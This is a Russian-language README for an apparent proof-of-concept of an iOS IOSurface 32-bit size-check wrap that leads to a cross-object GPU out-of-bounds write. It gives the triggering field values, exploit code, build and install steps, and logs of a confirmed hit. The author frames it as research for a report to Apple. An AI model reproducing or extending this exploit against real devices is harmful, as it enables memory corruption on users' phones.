# F1OOB-PoC — IOSurface F1 wrap → GPU cross-object OOB write

> Статус: **PoC harness + подтверждённый примитив на 27.2 / 24B115 (iPhone14,7, T8110)**.
> Это **не kernel R/W** и не root. Примитив живёт в GPU-контексте приложения.

---

## 1. Что за баг

В `IOSurface.kext` (27.2, 24B115) парсер сжатых плоскостей считает суммарный
размер multi-slice compressed plane в 32-битной арифметике:

```c
// FUN_fffffff009c1af14, строки 1353-1363 (декомпиляция)
if (planeSize <
    (uint)((dataRegionBytesPerSlice + headerRegionBytesPerSlice) * sliceCount)) {
    reject;
}
```

Оба слагаемых и произведение — `uint`/`int`, поэтому проверка выполняется
по модулю 2^32. Форма:

```
IOSurfacePlaneSize                    = 0x10000
IOSurfaceAllocSize                    = 0x10000
IOSurfaceSliceCount                   = 4
IOSurfacePlaneDataRegionBytesPerSlice = 0x4000
IOSurfacePlaneHeaderRegionBytesPerSlice = 0x40000000
```

даёт:

```
data + header          = 0x40004000
(data + header) * 4    = 0x1_0001_0000   // истинный размер 4 GiB + 64 KiB
32-bit truncation      = 0x00010000      // 64 KiB
planeSize (0x10000) < 0x10000 == false    // проверка проходит
```

То есть ядро принимает поверхность, у которой заявленный logical region
**4 GiB + 64 KiB**, а реально выделено **64 KiB**. Дальше этот размер
потребляет GPU-путь (`AGX`/`IOGPU`), и там возникает несоответствие
VA-диапазона и реального allocation.

---

## 2. Что происходит на GPU-стороне

1. Поверхность создаётся через `IOSurfaceRoot` selector 0 (in-band XML).
2. Приложение открывает `AGXAcceleratorG14P` type 1 и вызывает selector 8
   с типом `0x82` и ID поверхности.
3. AGX создаёт GPU-ресурс. В output:

```
out+0x00 = GPU VA ресурса      (например 0x1500000000)
out+0x28 = заявленный span     (в favorable state — 0x1000000 / 16 MiB,
                                в fresh state — 0x10000 / 64 KiB)
```

4. Приложение оборачивает 64 KiB IOSurface в `MTLBuffer` через
   `newBufferWithBytesNoCopy:length:0x10000`. `gpuAddress` этого буфера
   совпадает с `out+0x00`.
5. GPU page table — **per-context**. Следующие `MTLBuffer`-ы получают GPU VA
   рядом с F1-буфером. Shader-аргумент `device uint *buf` — это просто
   GPU VA; Metal не вставляет bounds-check на каждое обращение.
6. Если посчитать `victim.gpuAddress - f1.gpuAddress` и записать через
   F1-буфер по этому индексу, запись уходит в **чужой Metal-буфер**,
   если его PTE замаплен в этом контексте.

Именно это и есть cross-object GPU OOB write: не «16 MiB физической памяти»,
а **коллизия GPU VA** внутри одного процесса/контекста.

---

## 3. Код PoC

Файл: `main.m`.

Ключевые шаги:

```objc
// 1. F1 surface via IOSurfaceRoot sel0
uint32_t sid = create_surface(conn, f1_xml(), "F1");

// 2. AGX resource
uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);

// 3. 64 KiB Metal wrapper around the 64 KiB IOSurface
id<MTLBuffer> f1buf = [dev newBufferWithBytesNoCopy:base
                                             length:0x10000
                                            options:MTLResourceStorageModeShared
                                        deallocator:nil];
uint64_t f1ga = gpu_address(f1buf);

// 4. Victim Metal buffer allocated after F1
id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                        options:MTLResourceStorageModeShared];
uint64_t victimga = gpu_address(victim);

// 5. Write through the F1 buffer at the victim's GPU address
uint32_t idx = (uint32_t)((victimga - f1ga) / 4);
uint32_t marker = 0x43434343;

// kernel void wr(device uint *buf [[buffer(0)]],
//                constant uint &idx [[buffer(1)]],
//                constant uint &val [[buffer(2)]]) { buf[idx] = val; }
// dispatch with f1buf, idx, marker

// 6. Check the victim's CPU contents
uint32_t back;
memcpy(&back, victim.contents, 4);
if (back == marker) {
    // cross-object GPU OOB write confirmed
}
```

Дополнительно PoC делает reference-тест фиксированного `+0x20000` и
логирует, backed ли эта страница в текущем запуске. Фиксированный offset
**не портативен**; цель должна выбираться по runtime `gpuAddress`.

---

## 4. Сборка, подпись, запуск

Theos не поддерживает пробелы в пути, поэтому собирать нужно в каталоге
без пробелов:

```bash
cd /home/femboychik/asuka4scape/02_KERNEL/f1_poc
make clean && make ipa
```

Подпись:

```bash
zsign -k cert.p12 -p <pass> -m profile.mobileprovision \
      -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
```

Установка/запуск:

```bash
pymobiledevice3 apps install F1OOB-PoC-signed.ipa
pymobiledevice3 developer core-device launch-application --kill-existing \
  app.lake9674.aquila8809
```

Лог на устройстве:

```
Documents/F1OOB-PoC/latest.log
Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
```

---

## 5. Что видно в логах

### 5.1. Подтверждённый cross-object hit (F1Probe, 27.2 / 24B115)

```
[METAL] gpuAddress=0x1500000000
[CTRLBUF] gpuAddress=0x1500100000
[XOBJ] f1ga=0x1500000000 ctrlga=0x1500100000 delta=0x100000 xidx=0x40000
[XOBJ] F1 write ctrl-va marker=0x43434343 status=4
[XOBJ] *** CROSS-OBJECT HIT ctrl off=0x0 ***
```

То есть запись через F1-буфер на `+0x100000` реально меняет содержимое
отдельного `MTLBuffer`.

### 5.2. Свежие запуски PoC (текущее состояние устройства)

С 15 filler-буферами victim попадает на `+0x180000`:

```
[AGX] sel8=0x0 gpuVA=0x1500000000 span=0x10000
[METAL] F1 MTLBuffer=... gpuAddress=0x1500000000
[METAL] victim MTLBuffer=... gpuAddress=0x1500180000
[METAL] delta=0x180000 span=0x10000 inSpan=no
[METAL] VICTIM[0]=0x42424242
[METAL] no cross-object hit
```

С 6 filler-буферами victim попадает на `+0xA8000` — всё ещё нет hit:

```
[METAL] victim MTLBuffer=... gpuAddress=0x15000a8000
[METAL] delta=0xa8000 span=0x10000 inSpan=no
[METAL] VICTIM[0]=0x42424242
[METAL] no cross-object hit
```

Это важный отрицательный результат: **16 MiB span/VA reservation не
воспроизводится детерминированно**. В favorable state (как в старых
прогонах F1Probe) AGX/VA allocator резервирует большой диапазон, и
cross-object hit работает на `+0x100000`. В fresh state тот же самый XML
даёт 64 KiB, и victim уже вне досягаемости.

Причина — state-dependent поведение AGX resource/VA allocator на этом
билде (первое мапление, кэш/резервация), а не разница в XML. XML в PoC
и в F1Probe **побайтово одинаковый** (1750 байт + NUL, sum `0x854b747c`).
Поэтому PoC — это harness: он логирует все адреса/span и выполняет
cross-object запись, но hit зависит от состояния AGX VA reservation.

---

## 6. Границы примитива

- **Same process / same GPU context.** Чужие процессы, ядро и SPTM
  в этот GPU VA не замаплены.
- **Не kernel R/W.** Запись идёт через GPU page table в GPU-страницы,
  а не в CPU page tables.
- **Нет page table/TTBAT в окне.** Полный скан 16 MiB показал только
  Metal-шейдеры и reciprocal-таблицы; page table/TTBAT там нет.
- **Фиксированные offset нестабильны.** Работает только target по
  runtime `gpuAddress`.
- **Span/VA reservation нестабильны.** PoC — harness; для стабильного
  hit нужен grooming/состояние, при котором AGX резервирует большой
  диапазон.

---

## 7. Что это даёт для Apple

Это memory-safety баг в цепочке:

```
sandboxed app
  -> IOSurface compressed-plane 32-bit wrap (F1)
  -> kernel accepts 4 GiB + 64 KiB logical region for 64 KiB allocation
  -> AGX/Metal resource VA mismatch
  -> cross-object GPU OOB write inside the app's GPU context
```

Для отчёта нужно приложить:

1. F1 XML и точные поля.
2. Лог `sel0` (parser accepted) и AGX `out+0x00/out+0x28`.
3. Лог cross-object hit по `gpuAddress` (F1Probe).
4. Указание, что primitive same-context, не kernel R/W.

---

## 8. Файлы

```
main.m              — PoC
Makefile            — Theos build
Info.plist          — bundle app.lake9674.aquila8809
entitlements.plist  — empty
README.md           — этот файл
```

Успешный лог F1Probe:

```
evidence/f1-XOBJ-20261106-171110.log
```
